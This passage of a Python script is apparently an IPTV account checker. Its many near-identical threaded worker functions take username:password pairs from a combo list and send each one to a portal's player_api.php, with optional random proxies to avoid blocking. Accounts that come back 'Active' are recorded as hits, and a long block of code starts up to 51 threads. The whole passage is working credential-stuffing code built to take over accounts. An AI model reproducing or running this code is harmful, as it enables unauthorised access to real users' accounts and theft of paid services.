			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('   🎵 🇭 🇮 🇹 🎵                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)

def d46():
	global hit
	global proxy_
	say=0
	for fyz in range(46,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='46'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('   🎵 🇭 🇮 🇹 🎵                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)

def d47():
	global hit
	global proxy_
	say=0
	for fyz in range(47,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='47'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('   🎵 🇭 🇮 🇹 🎵                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)

def d48():
	global hit
	global proxy_
	say=0
	for fyz in range(48,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='48'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('   🎵 🇭 🇮 🇹 🎵                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)

def d49():
	global hit
	global proxy_
	say=0
	for fyz in range(49,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='49'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('   🎵 🇭 🇮 🇹 🎵                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)

def d50():
	global hit
	global proxy_
	say=0
	for fyz in range(50,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='50'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('   🎵 🇭 🇮 🇹 🎵                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)                     
			 			 	
def d51():
	global hit
	global proxy_
	say=0
	for fyz in range(51,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='Maxkakashi'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='Maxkakashi'
			 say = int(say) +1
			 bot='51'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit,proxy_)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		if Pro == 'y':

							PP = Proxies().random_proxy(proxy_type)

							res = ses.get(link,headers=HEADERd, timeout=1, verify=False,proxies=PP)

							proxy_=str(PP)

			 		else:
							res = ses.get(link,headers=HEADERd, timeout=1, verify=False)
							proxy_="No"

			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('   🎵 🇭 🇮 🇹 🎵                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)

            
t1 = threading.Thread(target=d1)
t2 = threading.Thread(target=d2)
t3 = threading.Thread(target=d3)
t4 = threading.Thread(target=d4)
t5 = threading.Thread(target=d5)
t6= threading.Thread(target=d6)
t7= threading.Thread(target=d7)
t8= threading.Thread(target=d8)
t9= threading.Thread(target=d9)
t10= threading.Thread(target=d10)
t11= threading.Thread(target=d11)
t12= threading.Thread(target=d12)
t13= threading.Thread(target=d13)
t14= threading.Thread(target=d14)
t15= threading.Thread(target=d15)
t16= threading.Thread(target=d16)
t17= threading.Thread(target=d17)
t18= threading.Thread(target=d18)
t19= threading.Thread(target=d19)
t20= threading.Thread(target=d20)
t21= threading.Thread(target=d21)
t22= threading.Thread(target=d22)
t23= threading.Thread(target=d23)
t24= threading.Thread(target=d24)
t25= threading.Thread(target=d25)
t26= threading.Thread(target=d26)
t27= threading.Thread(target=d27)
t28= threading.Thread(target=d28)
t29= threading.Thread(target=d29)
t30= threading.Thread(target=d30)
t31= threading.Thread(target=d31)
t32= threading.Thread(target=d32)
t33= threading.Thread(target=d33)
t34= threading.Thread(target=d34)
t35= threading.Thread(target=d35)
t36= threading.Thread(target=d36)
t37= threading.Thread(target=d37)
t38= threading.Thread(target=d38)
t39= threading.Thread(target=d39)
t40= threading.Thread(target=d40)
t41= threading.Thread(target=d41)
t42= threading.Thread(target=d42)
t43= threading.Thread(target=d43)
t44= threading.Thread(target=d44)
t45= threading.Thread(target=d45)
t46= threading.Thread(target=d46)
t47= threading.Thread(target=d47)
t48= threading.Thread(target=d48)
t49= threading.Thread(target=d49)
t50= threading.Thread(target=d50)
t51= threading.Thread(target=d51)

t1.start()

if botsay==1 or botsay==2 or botsay==3 or botsay==4 or botsay==5 or botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==50 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
    t2.start()
if botsay==2 or botsay==3 or botsay==4 or botsay==5 or botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==50 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t3.start()
if botsay==3 or botsay==4 or botsay==5 or botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==50 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t4.start()
if botsay==4 or botsay==5 or botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==50 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t5.start()
if botsay==5 or botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==50 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t6.start()
if botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==50 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t7.start()
if botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==50 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t8.start()
if botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==50 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t9.start()
if botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==50 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t10.start()
if botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==50 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t11.start()
if botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==50 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t12.start()
if botsay==12 or botsay==13 or botsay==14 or botsay==50 or botsay== 16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t13.start()
if botsay==13 or botsay==14 or botsay==50 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t14.start()
if botsay==14 or botsay==50 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t15.start()
if botsay==50 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t16.start()
if botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t17.start()
if botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t18.start()
if botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t19.start()
if botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t20.start()
if botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t21.start()
if botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t22.start()
if botsay==22 or botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t23.start()
if botsay==23 or botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t24.start()
if botsay==24 or botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t25.start()
if botsay==25 or botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t26.start()
if botsay==26 or botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t27.start()
if botsay==27 or botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t28.start()
if botsay==28 or botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t29.start()
if botsay==29 or botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t30.start()
if botsay==30 or botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t31.start()
if botsay==31 or botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t32.start()
if botsay==32 or botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t33.start()
if botsay==33 or botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t34.start()
if botsay==34 or botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t35.start()
if botsay==35 or botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t36.start()
if botsay==36 or botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t37.start()
if botsay==37 or botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t38.start()
if botsay==38 or botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t39.start()
if botsay==39 or botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t40.start()
if botsay==40 or botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t41.start()
if botsay==41 or botsay==42 or botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t42.start()
if botsay==42 or botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t43.start()
if botsay==43 or botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t44.start()
if botsay==44 or botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t45.start()
if botsay==45 or botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t46.start()
if botsay==46 or botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t47.start()
if botsay==47 or botsay==48 or botsay==49 or botsay==50 :
	t48.start()
if botsay==48 or botsay==49 or botsay==50 :
	t49.start()
if botsay==49 or botsay==50 :
	t50.start()
if botsay==50 :
	t51.start()
             
                                                                                                                                                                         
            
